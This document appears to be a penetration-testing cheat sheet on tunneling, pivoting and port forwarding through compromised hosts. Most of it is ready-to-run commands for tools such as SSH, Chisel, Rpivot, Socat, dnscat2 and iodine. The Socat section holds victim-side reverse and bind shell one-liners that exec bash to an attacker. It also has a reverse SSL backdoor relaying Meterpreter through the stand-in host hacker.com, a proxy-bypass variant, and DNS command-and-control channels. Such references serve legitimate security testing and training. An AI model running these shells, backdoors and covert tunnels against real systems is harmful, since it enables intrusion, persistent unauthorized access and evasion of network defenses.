# Tunneling and Port Forwarding

## **SSH**

SSH graphical connection \(X\)

```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```

### Local Port2Port

Open new Port in SSH Server --&gt; Other port

```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```

### Port2Port

Local port --&gt; Compromised host \(SSH\) --&gt; Third\_box:Port

```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host 
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```

### Port2hostnet \(proxychains\)

Local Port --&gt; Compromised host\(SSH\) --&gt; Wherever

```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```

### VPN-Tunnel

You need **root in both devices** \(as you are going to create new interfaces\) and the sshd config has to allow root login:  
`PermitRootLogin yes`  
`PermitTunnel yes`

```bash
ssh username@server -w any:any #This wil create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
```

Enable forwarding in Server side

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

Set new route on client side

```text
route add -net 10.0.0.0/16 gw 1.1.1.1
```

## SSHUTTLE

You can **tunnel** via **ssh** all the **traffic** to a **subnetwork** through a host.  
Example, forwarding all the traffic going to 10.10.10.0/24

```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```

## Meterpreter

### Port2Port

Local port --&gt; Compromised host \(active session\) --&gt; Third\_box:Port

```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```

### Port2hostnet \(proxychains\)

```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

Another way:

```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```

## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

You need to upload a web file tunnel: ashx\|aspx\|js\|jsp\|php\|php\|jsp

```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```

## Chisel

You can download it from the releases page of [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)  
You need to use the **same version for client and server**

### socks

```bash
./chisel server -p 8080 --reverse #Server
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client
#And now you can use proxychains with port 1080 (default)
```

### Port forwarding

```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505
```

## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Reverse tunnel. The tunnel is started from the victim.  
A socks4 proxy is created on 127.0.0.1:1080

```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```

Pivot through **NTLM proxy**

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell

```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

### Reverse shell

```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

### Port2Port

```bash
socat TCP-LISTEN:<lport>,fork TCP:<redirect_ip>:<rport> &
```

### Port2Port through socks

```bash
socat TCP-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```

### Meterpreter through SSL Socat

```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```

You can bypass a **non-authenticated proxy** executing this line instead of the last one in the victim's console:

```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```

[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Create certificates in both sides: Client and Server

```bash
# Execute this commands in both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```

### Remote Port2Port

Connect the local SSH port \(22\) to the 443 port of the attacker host

```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost 
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22 
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```

## Plink.exe

It's like a console PuTTY version \( the options are very similar to a ssh client\).

As this binary will be executed in the victim and it is a ssh client, we need to open our ssh service and port so we can have a reverse connection. Then, to forward a only locally accessible port to a port in our machine:

```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```

## NTLM proxy bypass

The previously mentioned tool: **Rpivot**  
**OpenVPN** can also bypass it, setting these options in the configuration file:

```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

It authenticates against a proxy and binds a port locally that is forwarded to the external service you specify. Then, you can use the tool of your choice through this port.  
Example that forward port 443

```text
Username Alice 
Password P@ssw0rd 
Domain CONTOSO.COM 
Proxy 10.0.0.10:8080 
Tunnel 2222:<attackers_machine>:443
```

Now, if you set for example in the victim the **SSH** service to listen in port 443. You can connect to it through the attacker port 2222.  
You could also use a **meterpreter** that connects to localhost:443 and the attacker is listening in port 2222.

## YARP

A reverse proxy create by Microsoft. You can find it here: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Root is needed in both systems to create tun adapters and tunnels data between them using DNS queries.

```text
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```

The tunnel will be really slow. You can create a compressed SSH connection through this tunnel by using:

```text
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

### DNSCat2

Establishes a C&C channel through DNS. It doesn't need root privileges.

```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com
```

**Port forwarding with dnscat**

```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```

#### Change proxychains DNS

Proxychains intercepts `gethostbyname` libc call and tunnels tcp DNS request through the socks proxy. By **default** the **DNS** server that proxychains use is **4.2.2.2** \(hardcoded\). To change it, edit the file: _/usr/lib/proxychains3/proxyresolv_ and change the IP. If you are in a **Windows environment** you could set the IP of the **domain controller**.

## Tunnels in Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)  
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Root is needed in both systems to create tun adapters and tunnels data between them using ICMP echo requests.

```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```

## Other tools to check

* [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
* [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)
* [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)

